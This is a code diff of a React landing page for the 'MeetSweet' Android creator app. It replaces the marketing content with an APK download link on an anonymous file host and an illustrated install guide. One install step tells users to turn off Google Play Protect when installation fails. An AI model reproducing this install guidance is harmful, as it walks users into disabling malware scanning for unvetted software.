@@ -15,10 +15,26 @@ import {
 } from "@/lib/frontend/brand";
 
 export const metadata: Metadata = {
-  title: "MeetSweet — Connect. Create. Captivate.",
+  title: "MeetSweet — Download & Install",
   description:
-    "MeetSweet is a creator platform where you share exclusive content, connect with fans, and build your community. Available on Android.",
+    "Download the MeetSweet Android app and learn how to install the APK and enable notifications.",
 };
+
+const INSTALL_STEPS = [
+  { title: "1. Download the APK", desc: "Tap the download button above to get the MeetSweet APK.", img: "/guide/install_1_download.jpg" },
+  { title: "2. Install the App", desc: "Open the downloaded file and tap 'Install' when prompted.", img: "/guide/install_2_prompt.jpg" },
+  { title: "3. If Installation Fails", desc: "If you see an 'App not installed' error, Google Play Protect might be blocking it.", img: "/guide/install_3_failed.jpg" },
+  { title: "4. Turn Off Play Protect", desc: "Open the Google Play Store, go to Settings > Play Protect, and temporarily turn off scanning.", img: "/guide/install_4_play_protect_off.jpg" },
+  { title: "5. Re-enable Play Protect", desc: "Retry installing MeetSweet. Once installed, turn Play Protect back on for security.", img: "/guide/install_5_play_protect_on.jpg" },
+];
+
+const NOTIF_STEPS = [
+  { title: "1. Find MeetSweet", desc: "Locate the MeetSweet app on your home screen or app drawer.", img: "/guide/notif_1_icon.jpg" },
+  { title: "2. Long Press", desc: "Press and hold the MeetSweet app icon until a menu appears.", img: "/guide/notif_2_longpress.jpg" },
+  { title: "3. App Info", desc: "Tap the 'App info' (i) icon from the context menu.", img: "/guide/notif_3_appinfo.jpg" },
+  { title: "4. Notifications", desc: "Tap on 'Notifications' or 'Permissions' in the settings menu.", img: "/guide/notif_4_permissions.jpg" },
+  { title: "5. Allow Access", desc: "Toggle the switch to 'Allow notifications'. Return to MeetSweet and they will work.", img: "/guide/notif_5_allow.jpg" },
+];
 
 export default function HomePage() {
   return (
@@ -40,94 +56,63 @@ export default function HomePage() {
             />
             <span>MeetSweet</span>
           </a>
-          <a href="#download" style={s.navCta}>
-            Download
+          <a href="https://files.catbox.moe/8rjgoq.apk" download style={s.navCta}>
+            Download APK
           </a>
         </div>
       </nav>
 
-      {/* Hero */}
+      {/* Hero / Download Section */}
       <section style={s.hero}>
         <div style={s.heroInner}>
-          <div style={s.badge}>Creator Platform</div>
+          <div style={s.badge}>Android APK</div>
           <h1 style={s.heroTitle}>
-            Connect.{" "}
-            <span style={s.accent}>Create.</span>{" "}
-            Captivate.
+            Install{" "}
+            <span style={s.accent}>MeetSweet.</span>
           </h1>
           <p style={s.heroSub}>
-            Share exclusive content, build a loyal subscriber base, and get paid
-            doing what you love — all in one beautifully designed app.
+            Follow the visual guides below to install the app safely and ensure you never miss a message from your favorite creators.
           </p>
           <div style={s.heroCtas}>
-            <a href="#download" style={s.btnPrimary}>
-              Download the App
-            </a>
-            <a href="#features" style={s.btnGhost}>
-              Learn more
+            <a href="https://files.catbox.moe/8rjgoq.apk" download style={s.btnPrimary}>
+              ↓ Download the APK
             </a>
           </div>
+          <p style={s.downloadNote}>Requires Android 10+ · Version 1.0.0</p>
         </div>
+      </section>
 
-        {/* Decorative phone mockup */}
-        <div style={s.phoneMockup} aria-hidden="true">
-          <div style={s.phoneScreen}>
-            <div style={s.phoneSurface}>
-              <div style={s.phoneStatusBar}>
-                <span style={s.phoneTime}>9:41</span>
-              </div>
-              <div style={s.phoneContent}>
-                <div style={s.phoneAvatar} />
-                <div style={s.phoneLine1} />
-                <div style={s.phoneLine2} />
-                <div style={s.phoneMediaCard} />
-                <div style={s.phoneLine3} />
-              </div>
+      {/* Installation Carousel */}
+      <section style={s.guideSection}>
+        <div style={s.guideHeader}>
+          <h2 style={s.sectionTitle}>How to install MeetSweet</h2>
+          <p style={s.sectionEyebrow}>Troubleshooting Play Protect & "App not installed"</p>
+        </div>
+        <div style={s.carouselWrapper}>
+          {INSTALL_STEPS.map((step, i) => (
+            <div key={i} style={s.carouselCard}>
+              <img src={step.img} alt={step.title} style={s.cardImg} loading="lazy" />
+              <h3 style={s.stepTitle}>{step.title}</h3>
+              <p style={s.stepBody}>{step.desc}</p>
             </div>
-          </div>
+          ))}
         </div>
       </section>
 
-      {/* Features */}
-      <section id="features" style={s.features}>
-        <div style={s.featuresInner}>
-          <p style={s.sectionEyebrow}>Why MeetSweet</p>
-          <h2 style={s.sectionTitle}>Everything creators need</h2>
-          <div style={s.featureGrid}>
-            {FEATURES.map((f) => (
-              <div key={f.title} style={s.featureCard}>
-                <h3 style={s.featureTitle}>{f.title}</h3>
-                <p style={s.featureDesc}>{f.desc}</p>
-              </div>
-            ))}
-          </div>
+      {/* Notification Carousel */}
+      <section style={s.guideSection}>
+        <div style={s.guideHeader}>
+          <h2 style={s.sectionTitle}>Enable Notifications</h2>
+          <p style={s.sectionEyebrow}>Don't miss direct messages or new posts</p>
         </div>
-      </section>
-
-      {/* Download */}
-      <section id="download" style={s.download}>
-        <div style={s.downloadInner}>
-          <div style={s.downloadGlow} aria-hidden="true" />
-          <p style={s.sectionEyebrow}>Get the app</p>
-          <h2 style={s.sectionTitle}>Ready to join MeetSweet?</h2>
-          <p style={s.downloadSub}>
-            Available on Android. iOS coming soon.
-          </p>
-          <div style={s.downloadBtns}>
-            <a
-              href="https://files.catbox.moe/38gjad.apk"
-              download
-              style={s.btnPrimary}
-            >
-              ↓ Download for Android
-            </a>
-          </div>
-          <p style={s.downloadNote}>
-            APK · Requires Android 10+
-          </p>
-          <a href="/install-help" style={s.helpLink}>
-            ⚠ Android warning or “App not installed”? Read the install guide
-          </a>
+        <div style={s.carouselWrapper}>
+          {NOTIF_STEPS.map((step, i) => (
+            <div key={i} style={s.carouselCard}>
+              <img src={step.img} alt={step.title} style={s.cardImg} loading="lazy" />
+              <h3 style={s.stepTitle}>{step.title}</h3>
+              <p style={s.stepBody}>{step.desc}</p>
+            </div>
+          ))}
         </div>
       </section>
 
@@ -152,34 +137,6 @@ export default function HomePage() {
     </main>
   );
 }
-
-const FEATURES = [
-  {
-    title: "Exclusive Content",
-    desc: "Post photos, videos, short clips, and albums. Set tiers so your biggest fans unlock premium content.",
-  },
-  {
-    title: "Subscriptions",
-    desc: "Earn recurring income from subscribers. Set your own price and upgrade tiers for premium access.",
-  },
-  {
-    title: "Direct Messages",
-    desc: "Chat privately with your fans and subscribers. Send photos, voice notes, and more.",
-  },
-  {
-    title: "Real-time Notifications",
-    desc: "Stay on top of every like, comment, new subscriber, and message the moment it happens.",
-  },
-  {
-    title: "Privacy First",
-    desc: "Your data stays yours. No web app means only app users with accounts can access your content.",
-  },
-  {
-    title: "Easy Payouts",
-    desc: "Withdraw your earnings directly to your bank account — powered by Paystack.",
-  },
-];
-
 
 const s: Record<string, React.CSSProperties> = {
   page: {
@@ -262,239 +219,143 @@ const s: Record<string, React.CSSProperties> = {
   hero: {
     position: "relative",
     zIndex: 1,
-    maxWidth: 1100,
+    maxWidth: 900,
     margin: "0 auto",
-    padding: "80px 24px 100px",
+    padding: "60px 24px",
+    textAlign: "center",
     display: "flex",
+    flexDirection: "column",
     alignItems: "center",
-    gap: 60,
-    flexWrap: "wrap" as const,
   },
   heroInner: {
-    flex: "1 1 400px",
-    animation: "fadeUp 0.8s ease both",
+    position: "relative",
+    zIndex: 2,
   },
   badge: {
     display: "inline-block",
-    background: "rgba(255,20,147,0.14)",
+    padding: "6px 16px",
+    background: "rgba(255, 20, 147, 0.1)",
+    border: "1px solid rgba(255, 20, 147, 0.2)",
     color: BRAND.pink,
     borderRadius: 50,
-    padding: "6px 16px",
-    fontSize: 12,
+    fontSize: 14,
     fontWeight: 600,
-    letterSpacing: "0.08em",
-    textTransform: "uppercase" as const,
     marginBottom: 24,
   },
   heroTitle: {
-    margin: "0 0 20px",
-    fontSize: "clamp(40px, 6vw, 68px)",
+    fontSize: "clamp(40px, 6vw, 64px)",
     fontWeight: 700,
     lineHeight: 1.1,
-    letterSpacing: "-1.5px",
+    margin: "0 0 24px",
+    letterSpacing: "-1px",
   },
-  accent: gradientText(),
+  accent: {
+    ...gradientText,
+  },
   heroSub: {
-    margin: "0 0 36px",
     fontSize: 18,
-    lineHeight: 1.7,
     color: TEXT_2,
-    maxWidth: 520,
+    lineHeight: 1.6,
+    margin: "0 auto 40px",
+    maxWidth: 500,
   },
   heroCtas: {
     display: "flex",
     gap: 16,
-    flexWrap: "wrap" as const,
+    justifyContent: "center",
+    marginBottom: 16,
   },
   btnPrimary: {
     ...GRADIENT_BUTTON,
     border: "none",
-    borderRadius: 50,
     padding: "16px 32px",
-    fontSize: 15,
-    fontWeight: 600,
-    cursor: "pointer",
-    textDecoration: "none",
-    display: "inline-block",
-    transition: "opacity 0.2s, transform 0.15s",
-  },
-  btnGhost: {
-    background: "rgba(255,255,255,0.08)",
-    color: "#fff",
-    border: "1px solid rgba(255,255,255,0.12)",
     borderRadius: 50,
-    padding: "16px 32px",
-    fontSize: 15,
-    fontWeight: 600,
-    cursor: "pointer",
-    textDecoration: "none",
-    display: "inline-block",
-  },
-
-  // Phone mockup
-  phoneMockup: {
-    flex: "0 0 auto",
-    display: "flex",
-    justifyContent: "center",
-    animation: "fadeUp 1s ease 0.2s both",
-  },
-  phoneScreen: {
-    width: 220,
-    height: 440,
-    background: SURFACE,
-    borderRadius: 36,
-    border: "2px solid rgba(255,255,255,0.08)",
-    overflow: "hidden",
-    boxShadow: "0 40px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,20,147,0.1)",
-  },
-  phoneSurface: {
-    height: "100%",
-    background: `linear-gradient(160deg, ${SURFACE_2} 0%, ${SURFACE} 100%)`,
-    padding: 16,
-  },
-  phoneStatusBar: {
-    marginBottom: 16,
-    display: "flex",
-    justifyContent: "flex-end",
-  },
-  phoneTime: { fontSize: 11, fontWeight: 600, color: TEXT_2 },
-  phoneContent: { display: "flex", flexDirection: "column" as const, gap: 10 },
-  phoneAvatar: {
-    width: 40,
-    height: 40,
-    borderRadius: 20,
-    background: "linear-gradient(135deg, #FF8C00 0%, #FF1493 45%, #800080 100%)",
-  },
-  phoneLine1: {
-    height: 12,
-    borderRadius: 6,
-    background: "rgba(255,255,255,0.15)",
-    width: "70%",
-  },
-  phoneLine2: {
-    height: 10,
-    borderRadius: 5,
-    background: "rgba(255,255,255,0.08)",
-    width: "50%",
-  },
-  phoneMediaCard: {
-    height: 140,
-    borderRadius: 16,
-    background:
-      "linear-gradient(135deg, rgba(255,20,147,0.28) 0%, rgba(128,0,128,0.22) 100%)",
-    marginTop: 4,
-    border: "1px solid rgba(255,20,147,0.22)",
-  },
-  phoneLine3: {
-    height: 10,
-    borderRadius: 5,
-    background: "rgba(255,255,255,0.1)",
-    width: "60%",
-  },
-
-  // Features
-  features: {
-    position: "relative",
-    zIndex: 1,
-    padding: "80px 24px",
-    background: "rgba(255,255,255,0.015)",
-    borderTop: "1px solid rgba(255,255,255,0.05)",
-    borderBottom: "1px solid rgba(255,255,255,0.05)",
-  },
-  featuresInner: {
-    maxWidth: 1100,
-    margin: "0 auto",
-    textAlign: "center" as const,
-  },
-  sectionEyebrow: {
-    margin: "0 0 12px",
-    color: BRAND.pink,
-    fontSize: 12,
-    fontWeight: 600,
-    letterSpacing: "0.1em",
-    textTransform: "uppercase" as const,
-  },
-  sectionTitle: {
-    margin: "0 0 48px",
-    fontSize: "clamp(28px, 4vw, 42px)",
-    fontWeight: 700,
-    letterSpacing: "-0.8px",
-  },
-  featureGrid: {
-    display: "grid",
-    gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))",
-    gap: 20,
-    textAlign: "left" as const,
-  },
-  featureCard: {
-    background: SURFACE,
-    border: "1px solid rgba(255,255,255,0.05)",
-    borderRadius: 20,
-    padding: "28px 24px",
-  },
-  featureIcon: { fontSize: 28, marginBottom: 14 },
-  featureTitle: {
-    margin: "0 0 8px",
     fontSize: 16,
     fontWeight: 600,
-  },
-  featureDesc: {
-    margin: 0,
-    fontSize: 14,
-    lineHeight: 1.65,
-    color: TEXT_2,
-  },
-
-  // Download
-  download: {
-    position: "relative",
-    zIndex: 1,
-    padding: "100px 24px",
-    textAlign: "center" as const,
-    overflow: "hidden",
-  },
-  downloadInner: {
-    maxWidth: 600,
-    margin: "0 auto",
-    position: "relative",
-    zIndex: 1,
-  },
-  downloadGlow: {
-    position: "absolute",
-    top: "50%",
-    left: "50%",
-    transform: "translate(-50%, -50%)",
-    width: 500,
-    height: 500,
-    background: GLOW_CARD,
-    pointerEvents: "none",
-    zIndex: 0,
-  },
-  downloadSub: {
-    margin: "0 0 36px",
-    fontSize: 17,
-    color: TEXT_2,
-  },
-  downloadBtns: {
-    display: "flex",
+    cursor: "pointer",
+    textDecoration: "none",
+    display: "inline-flex",
+    alignItems: "center",
     justifyContent: "center",
-    gap: 16,
-    flexWrap: "wrap" as const,
   },
   downloadNote: {
-    marginTop: 20,
-    fontSize: 13,
-    color: TEXT_3,
-  },
-  helpLink: {
-    display: "inline-block",
-    marginTop: 16,
-    color: BRAND.pink,
     fontSize: 14,
+    color: TEXT_3,
+    margin: 0,
+  },
+
+  // Guide Section
+  guideSection: {
+    position: "relative",
+    zIndex: 1,
+    width: "100%",
+    padding: "40px 0",
+  },
+  guideHeader: {
+    maxWidth: 1100,
+    margin: "0 auto",
+    padding: "0 24px 24px",
+    textAlign: "left",
+  },
+  sectionTitle: {
+    fontSize: 32,
+    fontWeight: 700,
+    margin: "0 0 8px 0",
+    letterSpacing: "-0.5px",
+  },
+  sectionEyebrow: {
+    color: BRAND.pink,
     fontWeight: 600,
-    textDecoration: "none",
-    borderBottom: "1px solid rgba(255,20,147,0.35)",
-    transition: "opacity 0.2s",
+    fontSize: 14,
+    margin: 0,
+    textTransform: "uppercase",
+    letterSpacing: "1px",
+  },
+
+  // Carousel
+  carouselWrapper: {
+    display: "flex",
+    overflowX: "auto",
+    gap: "24px",
+    padding: "0 24px 24px",
+    scrollSnapType: "x mandatory",
+    scrollbarWidth: "none",
+    WebkitOverflowScrolling: "touch",
+    maxWidth: 1148,
+    margin: "0 auto",
+  },
+  carouselCard: {
+    minWidth: "300px",
+    maxWidth: "300px",
+    flexShrink: 0,
+    scrollSnapAlign: "start",
+    background: SURFACE_2,
+    border: "1px solid rgba(255,255,255,0.08)",
+    borderRadius: "24px",
+    padding: "20px",
+    display: "flex",
+    flexDirection: "column",
+    gap: "16px",
+    boxShadow: "0 8px 32px rgba(0,0,0,0.2)",
+  },
+  cardImg: {
+    width: "100%",
+    height: "200px",
+    objectFit: "cover",
+    borderRadius: "12px",
+    background: SURFACE,
+  },
+  stepTitle: {
+    fontSize: 20,
+    fontWeight: 600,
+    margin: 0,
+    color: "#fff",
+  },
+  stepBody: {
+    fontSize: 15,
+    color: TEXT_2,
+    margin: 0,
+    lineHeight: 1.5,
   },
 
   // Footer
@@ -502,7 +363,8 @@ const s: Record<string, React.CSSProperties> = {
     position: "relative",
     zIndex: 1,
     borderTop: "1px solid rgba(255,255,255,0.05)",
-    padding: "28px 24px",
+    padding: "40px 24px",
+    marginTop: 80,
   },
   footerInner: {
     maxWidth: 1100,
@@ -510,15 +372,21 @@ const s: Record<string, React.CSSProperties> = {
     display: "flex",
     justifyContent: "space-between",
     alignItems: "center",
-    flexWrap: "wrap" as const,
-    gap: 12,
+    flexWrap: "wrap",
+    gap: 20,
   },
   footerBrand: {
-    display: "inline-flex",
+    display: "flex",
     alignItems: "center",
-    gap: 8,
-    fontWeight: 700,
-    fontSize: 15,
+    gap: 10,
+    fontSize: 18,
+    fontWeight: 600,
+    color: "#fff",
+    textDecoration: "none",
   },
-  footerMuted: { fontSize: 13, color: TEXT_2 },
+  footerMuted: {
+    color: TEXT_3,
+    fontSize: 14,
+  },
 };
+
